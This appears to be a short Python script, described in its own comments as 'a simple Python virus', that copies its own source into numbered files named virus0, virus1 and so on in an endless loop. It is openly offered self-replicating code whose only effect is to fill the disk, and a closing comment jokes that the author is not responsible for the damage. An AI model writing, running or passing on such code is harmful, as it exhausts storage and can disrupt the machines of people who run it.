indicator = 0

while True:
    with open("virus{0}".format(indicator), "w") as f:
        f.write(open(__file__).read())
        f.close()
        indicator += 1

# Just a simple Python virus
# Post Script: Becareful! This will take up your storage / space! Not my responsibility if you screwed up ;)
